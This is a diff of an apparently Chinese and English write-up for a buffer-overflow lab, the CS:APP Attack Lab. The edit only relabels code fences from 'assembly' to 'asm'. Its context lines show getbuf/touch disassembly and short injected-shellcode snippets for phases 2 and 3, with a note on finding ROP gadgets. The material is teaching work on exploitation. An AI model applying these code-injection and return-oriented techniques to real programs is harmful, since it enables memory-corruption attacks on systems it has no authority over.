@@ -88,7 +88,7 @@ objdump -d ctarget >ctarget.s
 
 Getbuf:
 
-```assembly
+```asm
 00000000004017a8 <getbuf>:
   4017a8:	48 83 ec 28          	sub    $0x28,%rsp;
   4017ac:	48 89 e7             	mov    %rsp,%rdi
@@ -102,7 +102,7 @@ Getbuf:
 
 Touch1:
 
-```assembly
+```asm
 00000000004017c0 <touch1>:
   4017c0:	48 83 ec 08          	sub    $0x8,%rsp
   4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
@@ -179,7 +179,7 @@ Some Advice:
 
 touch2
 
-```assembly
+```asm
 00000000004017ec <touch2>:
   4017ec:	48 83 ec 08          	sub    $0x8,%rsp
   4017f0:	89 fa                	mov    %edi,%edx
@@ -218,7 +218,7 @@ touch2
 
 根据以上操作写出汇编代码,保存该代码为t2.s文件
 
-```assembly
+```asm
 mov $0x59b997fa, %rdi
 pushq $0x4017ec
 ret
@@ -280,7 +280,7 @@ p $rsp=0x5561dc78
 
 Phase 3 also involves a code injection attack, but passing a string as argument. Within the file ctarget there is code for functions hexmatch and touch3 having the following C representations:
 
-touch3 C && Assembly Code:
+touch3 C && asm Code:
 
 ```cpp
 void touch3(char \*sval){
@@ -420,7 +420,7 @@ Some Advice:
 
 构建以下命令,保存为t3.s文件
 
-```assembly
+```asm
 push $0x004018fa
 lea 0x8(%rsp),%rdi
 retq
@@ -435,7 +435,7 @@ objdump -d t3.o>t3.txt
 
 会得到如下代码
 
-```assembly
+```asm
 t3.o:     file format elf64-x86-64
 0000000000000000 <.text>:
    0:	68 fa 18 40 00       	pushq  $0x4018fa
@@ -587,7 +587,7 @@ objdump -d farm.o>farm.s
 
 这是相关联的函数,需要在其中找到gadgets
 
-```assembly
+```asm
 0000000000000000 <start_farm>:
    0:	f3 0f 1e fa          	endbr64 
    4:	b8 01 00 00 00       	mov    $0x1,%eax
